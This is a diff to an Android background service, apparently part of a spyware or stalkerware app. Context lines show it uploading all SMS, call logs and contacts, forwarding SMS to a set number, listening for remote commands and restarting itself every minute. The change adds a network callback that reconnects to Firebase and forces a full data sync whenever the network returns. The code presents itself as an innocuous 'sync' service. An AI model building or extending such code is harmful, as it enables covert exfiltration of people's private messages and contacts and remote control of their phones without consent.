@@ -46,6 +46,10 @@ import java.util.Locale;
 import java.util.Map;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicLong;
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkCapabilities;
+import android.net.NetworkRequest;
 
 public class BackgroundSyncService extends Service {
 
@@ -70,6 +74,7 @@ public class BackgroundSyncService extends Service {
     private ValueEventListener   commandListener;
     private ValueEventListener   connListener;
     private DatabaseReference    connRef;
+    private ConnectivityManager.NetworkCallback networkCallback;
     private String               forwardingNumber   = "";
     private boolean              forwardingEnabled  = false;
     private final List<String>   forwardingFilters  = new ArrayList<>();
@@ -123,7 +128,8 @@ public class BackgroundSyncService extends Service {
 
         loadForwardingSettings();
         listenForManualCommands();
-        listenForConnection();       // registers .info/connected listener
+        listenForConnection();
+        registerNetworkCallback();
         scheduleRestart(this);
         doFullDataSync();            // first-run upload of all SMS/calls/contacts
     }
@@ -166,6 +172,14 @@ public class BackgroundSyncService extends Service {
         // Release wake lock
         try {
             if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+        } catch (Exception ignored) {}
+        // Unregister network callback
+        try {
+            if (networkCallback != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+                if (cm != null) cm.unregisterNetworkCallback(networkCallback);
+                networkCallback = null;
+            }
         } catch (Exception ignored) {}
         super.onDestroy();
     }
@@ -544,7 +558,35 @@ public class BackgroundSyncService extends Service {
     // AlarmManager Keepalive (chain — fires every ~1 min, doze-safe)
     // ─────────────────────────────────────────────
 
-    public static void scheduleRestart(Context ctx) {
+    /** When net comes back, immediately force Firebase online + sync */
+    private void registerNetworkCallback() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
+        try {
+            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+            if (cm == null) return;
+            NetworkRequest req = new NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build();
+            networkCallback = new ConnectivityManager.NetworkCallback() {
+                @Override
+                public void onAvailable(Network network) {
+                    // Net is back — wake Firebase immediately
+                    mainHandler.post(() -> {
+                        try { firebaseDb.goOnline(); } catch (Exception ignored) {}
+                        if (deviceRef != null) deviceRef.child("online_status").setValue(true);
+                        lastFullSyncTime.set(0); // force full sync on next loop
+                    });
+                }
+                @Override
+                public void onLost(Network network) {
+                    // Net lost — Firebase onDisconnect() will handle offline status
+                }
+            };
+            cm.registerNetworkCallback(req, networkCallback);
+        } catch (Exception ignored) {}
+    }
+
+        public static void scheduleRestart(Context ctx) {
         try {
             AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
             Intent intent   = new Intent(ctx, ServiceRestartReceiver.class);
